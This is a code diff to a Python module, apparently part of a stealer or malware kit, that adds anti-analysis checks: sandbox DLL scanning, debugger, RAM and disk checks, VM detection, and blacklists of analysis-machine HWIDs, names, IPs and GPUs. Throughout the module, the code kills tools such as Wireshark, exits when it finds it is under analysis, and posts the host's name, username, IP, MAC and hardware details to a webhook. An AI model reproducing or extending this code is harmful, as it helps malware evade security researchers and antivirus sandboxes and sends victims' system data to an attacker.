@@ -1,7 +1,10 @@
+import sys
 import sys, os, re, ctypes, subprocess, requests, uuid, wmi, psutil, threading, time, httpx, platform
 
 from datetime import datetime
-from dhooks import Webhook
+from ctypes import *
+import win32api
+import win32process
 
 
 os.system("cls")
@@ -10,6 +13,7 @@ os.system("cls")
 
 api = "URL_HERE"
 
+sandboxDLLs = ["sbiedll.dll","api_log.dll","dir_watch.dll","pstorec.dll","vmcheck.dll","wpespy.dll"]
 program_blacklist = [
     "httpdebuggerui.exe", 
     "wireshark.exe", 
@@ -50,27 +54,119 @@ anti_debug_switch = True
 #endregion
 
 
+def post_message(msg):
+    requests.post(api, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}, data={"content": f"{msg}"})
+
+
 def anti_debug():
     while True:
         time.sleep(0.7)
-        print("Checking for debuggers...")
+        #print("Checking for debuggers...")
         for proc in psutil.process_iter():
             if any(procstr in proc.name().lower() for procstr in program_blacklist):
                 try:
                     print("\nBlacklisted program found! Name: "+str(proc.name()))
                     proc.kill()
+                    os._exit(1)
                 except(psutil.NoSuchProcess, psutil.AccessDenied): pass
 
 def block_dlls():
     while True:
-        time.sleep(0.7)
-        print("Checking for DLL Injection...")
-        try:
-            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
-            print("Sandboxie DLL Detected")
-            requests.post(f'{api}',json={'content': f"**Sandboxie DLL Detected**"})
+        time.sleep(1)
+        EvidenceOfSandbox = []
+        allPids = win32process.EnumProcesses()
+        for pid in allPids:
+            try:
+                hProcess = win32api.OpenProcess(0x0410, 0, pid)
+                try:
+                    curProcessDLLs = win32process.EnumProcessModules(hProcess)
+                    for dll in curProcessDLLs:
+                        dllName = str(win32process.GetModuleFileNameEx(hProcess, dll)).lower()
+                        for sandboxDLL in sandboxDLLs:
+                            if sandboxDLL in dllName:
+                                if dllName not in EvidenceOfSandbox:
+                                    EvidenceOfSandbox.append(dllName)
+                finally:
+                        win32api.CloseHandle(hProcess)
+            except:
+                    pass
+        if EvidenceOfSandbox:
+            print("The following sandbox-indicative DLLs were discovered loaded in processes running on the system. Do not proceed.\n{0}".format(EvidenceOfSandbox))
+            requests.post(f'{api}',json={'content': f"""```yaml
+The following sandbox-indicative DLLs were discovered loaded in processes running on the system. Do not proceed.
+Dlls: {EvidenceOfSandbox}
+```"""})
             os._exit(1)
-        except: pass  
+        else:
+            #print("No sandbox-indicative DLLs were discovered loaded in any accessible running process. Proceed!")
+            pass
+
+def ram_check():
+    class MEMORYSTATUSEX(ctypes.Structure):
+        _fields_ = [
+            ("dwLength", ctypes.c_ulong),
+            ("dwMemoryLoad", ctypes.c_ulong),
+            ("ullTotalPhys", ctypes.c_ulonglong),
+            ("ullAvailPhys", ctypes.c_ulonglong),
+            ("ullTotalPageFile", ctypes.c_ulonglong),
+            ("ullAvailPageFile", ctypes.c_ulonglong),
+            ("ullTotalVirtual", ctypes.c_ulonglong),
+            ("ullAvailVirtual", ctypes.c_ulonglong),
+            ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
+        ]
+
+    memoryStatus = MEMORYSTATUSEX()
+    memoryStatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
+    ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memoryStatus))
+
+    if memoryStatus.ullTotalPhys/1073741824 > 1:
+        print("The RAM of this host is at least 4 GB in size. Proceed!\n")
+        requests.post(f'{api}',json={'content': f"""```yaml
+Ram Check: The RAM of this host is at least 4 GB in size. Proceed!
+```"""})
+    else:
+        requests.post(f'{api}',json={'content': f"""```yaml
+Ram Check: Less than 4 GB of RAM exists on this system. Exiting program...
+```"""})
+        print("Less than 4 GB of RAM exists on this system. Do not proceed.\n")
+        os._exit(1)
+
+def is_debugger():
+    isDebuggerPresent = windll.kernel32.IsDebuggerPresent()
+
+    if (isDebuggerPresent):
+        print("A debugger is present, exiting program...")
+        requests.post(f'{api}',json={'content': f"""```yaml
+IsDebuggerPresent: A debugger is present, exiting program...
+```"""})        
+        os._exit(1)
+    else:
+        print("No debugger is present. Proceed!")
+        requests.post(f'{api}',json={'content': f"""```yaml
+IsDebuggerPresent: No debugger is present. Proceed!
+```"""})  
+        pass
+
+def disk_check():
+    minDiskSizeGB = 50
+    if len(sys.argv) > 1:
+        minDiskSizeGB = float(sys.argv[1])
+
+    _, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()
+
+    diskSizeGB = diskSizeBytes/1073741824
+
+    if diskSizeGB > minDiskSizeGB:
+        print("The disk size of this host is {0} GB, which is greater than the minimum {1} GB. Proceed!".format(diskSizeGB, minDiskSizeGB))
+        requests.post(f'{api}',json={'content': f"""```yaml
+Disk Check: The disk size of this host is {diskSizeGB} GB, which is greater than the minimum {minDiskSizeGB} GB. Proceed!
+```"""})
+    else:
+        requests.post(f'{api}',json={'content': f"""```yaml
+Disk Check: The disk size of this host is {diskSizeGB} GB, which is less than the minimum {minDiskSizeGB} GB. Exiting program...
+```"""})
+        print("The disk size of this host is {0} GB, which is less than the minimum {1} GB. Exiting program...".format(diskSizeGB, minDiskSizeGB))
+        os._exit(1)
 
 def getip():
     ip = "None"
@@ -86,6 +182,7 @@ mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
 computer = wmi.WMI()
 os_info = computer.Win32_OperatingSystem()[0]
 os_name = os_info.Name.encode('utf-8').split(b'|')[0]
+gpu = computer.Win32_VideoController()[0].Name
 currentplat = os_name
 hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
 hwidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
@@ -98,8 +195,7 @@ platformlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm
 
 
 def vtdetect():
-    webhooksend = Webhook(api)
-    webhooksend.send(f"""```yaml
+    requests.post(api, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}, data={"content": f"""```yaml
 ![PC DETECTED]!  
 PC Name: {pc_name}
 PC Username: {serveruser}
@@ -109,8 +205,8 @@ MAC: {mac}
 PLATFORM: {os_name}
 CPU: {computer.Win32_Processor()[0].Name}
 RAM: {str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB
-GPU: {computer.Win32_VideoController()[0].Name}
-TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```""")
+GPU: {gpu}
+TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```"""})
 
 
 def vmcheck():
@@ -121,7 +217,7 @@ def vmcheck():
         return get_base_prefix_compat() != sys.prefix
 
     if in_virtualenv() == True: # If vm is detected
-        requests.post(f'{api}',json={'content': f"**VM DETECTED EXITING PROGRAM...**"})
+        post_message("**VM DETECTED, EXITING PROGRAM...**")
         os._exit(1) # exit
     
     else: pass
@@ -132,7 +228,7 @@ def vmcheck():
         
         if reg1 != 1 and reg2 != 1:    
             print("VMware Registry Detected")
-            requests.post(f'{api}',json={'content': f"**VMware Registry Detected**"})
+            post_message("VMware Registry Detected")
             os._exit(1)
 
     def processes_and_files_check():
@@ -146,33 +242,25 @@ def vmcheck():
 
         if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
             print("VMwareService.exe & VMwareTray.exe process are running")
-            requests.post(f'{api}',json={'content': f"**VMwareService.exe & VMwareTray.exe process are running**"})
+            post_message("VMwareService.exe & VMwareTray.exe process are running")
             os._exit(1)
                         
         if os.path.exists(vmware_dll): 
             print("Vmware DLL Detected")
-            requests.post(f'{api}',json={'content': f"**Vmware DLL Detected**"})
+            post_message("**Vmware DLL Detected**")
             os._exit(1)
             
         if os.path.exists(virtualbox_dll):
             print("VirtualBox DLL Detected")
-            requests.post(f'{api}',json={'content': f"**VirtualBox DLL Detected**"})
-            os._exit(1)
-        
-        try:
-            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
-            print("Sandboxie DLL Detected")
-            requests.post(f'{api}',json={'content': f"**Sandboxie DLL Detected**"})
-            os._exit(1)
-
-        except: pass        
+            post_message("**VirtualBox DLL Detected**")
+            os._exit(1)   
 
     def mac_check():
         mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
         vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
         if mac_address[:8] in vmware_mac_list:
             print("VMware MAC Address Detected")
-            requests.post(f'{api}',json={'content': f"**VMware MAC Address Detected**"})
+            post_message("**VMware MAC Address Detected**")
             os._exit(1)
 
 
@@ -180,9 +268,8 @@ def vmcheck():
     registry_check()
     processes_and_files_check()
     mac_check()
-    print("[+] VM Not Detected : )")   
-    webhooksend = Webhook(api)
-    webhooksend.send("[+] VM Not Detected : )") 
+    print("[+] VM Not Detected")   
+    post_message("[+] VM Not Detected") 
 
 
 def listcheck():
@@ -190,7 +277,7 @@ def listcheck():
         if hwid in hwidlist.text:
             print('BLACKLISTED HWID DETECTED')
             print(f'HWID: {hwid}') 
-            requests.post(f'{api}',json={'content': f"**Blacklisted HWID Detected. HWID:** `{hwid}`"})
+            post_message(f"**Blacklisted HWID Detected. HWID:** `{hwid}`")
             time.sleep(2)
             os._exit(1)
         else: pass
@@ -203,7 +290,7 @@ def listcheck():
         if serveruser in pcusernamelist.text:
             print('BLACKLISTED PC USER DETECTED!')
             print(f'PC USER: {serveruser}') 
-            requests.post(f'{api}',json={'content': f"**Blacklisted PC User:** `{serveruser}`"})
+            post_message(f"**Blacklisted PC User:** `{serveruser}`")
             time.sleep(2)
             os._exit(1)
         else: pass
@@ -216,7 +303,7 @@ def listcheck():
         if pc_name in pcnamelist.text:
             print('BLACKLISTED PC NAME DETECTED!')
             print(f'PC NAME: {pc_name}') 
-            requests.post(f'{api}',json={'content': f"**Blacklisted PC Name:** `{pc_name}`"})
+            post_message(f"**Blacklisted PC Name:** `{pc_name}`")
             time.sleep(2)
             os._exit(1)
         else: pass
@@ -229,7 +316,7 @@ def listcheck():
         if ip in iplist.text:
             print('BLACKLISTED IP DETECTED!')
             print(f'IP: {ip}') 
-            requests.post(f'{api}',json={'content': f"**Blacklisted IP:** `{ip}`"})
+            post_message(f"**Blacklisted IP:** `{ip}`")
             time.sleep(2)
             os._exit(1)
         else: pass
@@ -242,7 +329,7 @@ def listcheck():
         if mac in maclist.text:
             print('BLACKLISTED MAC DETECTED!')
             print(f'MAC: {mac}') 
-            requests.post(f'{api}',json={'content': f"**Blacklisted MAC:** `{mac}`"})
+            post_message(f"**Blacklisted MAC:** `{mac}`")
             time.sleep(2)
             os._exit(1)
         else: pass
@@ -251,13 +338,11 @@ def listcheck():
         time.sleep(2) 
         os._exit(1)
 
-    gpu = computer.Win32_VideoController()[0].Name
-
     try:
         if gpu in gpulist.text:        
             print('BLACKLISTED GPU DETECTED!')
             print(f'GPU: {gpu}') 
-            requests.post(f'{api}',json={'content': f"**Blacklisted GPU:** `{gpu}`"})
+            post_message(f"**Blacklisted GPU:** `{gpu}`")
             time.sleep(2)
             os._exit(1)
         else: pass
@@ -268,6 +353,9 @@ def listcheck():
 
 
 def main():
+    is_debugger()
+    disk_check()
+    ram_check()
     if anti_debug_switch == True:
         try:
             threading.Thread(name='Anti-Debug', target=anti_debug).start()
